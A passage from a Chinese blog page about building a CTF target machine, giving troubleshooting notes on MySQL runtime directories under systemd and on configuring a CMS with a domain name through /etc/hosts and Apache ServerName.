原因：模板系统没有内置 MySQL 服务，需要额外部署；同时 <code>/run</code> 是 tmpfs，早期用 <code>/var/run/mysqld</code> 手动建目录的方式，重启后目录会消失，导致 Yii2 报 &quot;No such file or directory&quot;。</p> <p>最终做法：采用二进制部署 + systemd 的 <code>RuntimeDirectory=mysqld</code> 管理 <code>/run/mysqld</code>，具体步骤见前文「安装 MySQL 数据库」小节。</p> <h3 id="问题3-cms-部署时未使用域名"><a href="#问题3-cms-部署时未使用域名" class="header-anchor">#</a> 问题3：CMS 部署时未使用域名</h3> <p>现象：靶机在构建时硬编码了 IP，在分发给选手时出现部分资源加载问题。
原因：CMS 部署时未使用域名，导致部分资源加载失败。</p> <p>解决方案：</p> <ul><li>1、在靶机 /etc/hosts 里添加域名映射 127.0.0.1 example.com</li> <li>2、apache 配置文件里添加 ServerName example.com</li> <li>3、CMS 部署时使用 example.com 作为站点域名</li></ul></div></div>  <div class="page-edit"><div class="edit-link"><a href="https://github.com/Apursuit/Apursuit.github.io/edit/master/docs/07.share/08.MazeSec-Mao.md" target="_blank" rel="noopener noreferrer">编辑</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <!----> <div class="last-updated"><span class="prefix">最后一次更新于:</span> <span class="time">2025/12/10, 23:39:07</span></div></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/111z-make/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">MazeSec 111z 设计流程</div></a> <!----></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/pages/111z-make/" class="prev">MazeSec 111z 设计流程</a></span> <!----></p></div></div></div> <!----></main></div> <div class="footer"><div class="icons"><a href="mailto:admin@gmail.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/Apursuit" title="GitHub" target="_blank" class="iconfont icon-github"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2024-2026
    <span></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <!----> <!----> <!----></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.dd92e586.js" defer></script><script src="/assets/js/2.1b31a38c.js" defer></script><script src="/assets/js/124.a6b9e1a3.js" defer></script>
  </body>
</html>
